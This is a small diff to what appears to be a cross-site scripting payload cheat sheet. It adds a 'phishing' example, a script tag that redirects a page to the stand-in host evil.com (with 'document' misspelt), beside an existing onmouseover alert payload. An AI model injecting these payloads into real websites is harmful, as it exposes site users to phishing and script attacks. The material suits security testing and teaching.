@@ -69,5 +69,9 @@ location.pathname
   
   
 ** Onmouseover payload** : <a href="javascript:alert(1)" onmouseover=alert(1)>hovermeplz</a>
+
+XSS exploitation:
+
+phishing : <script>doument.location.href="http://evil.com"</script>
  
  
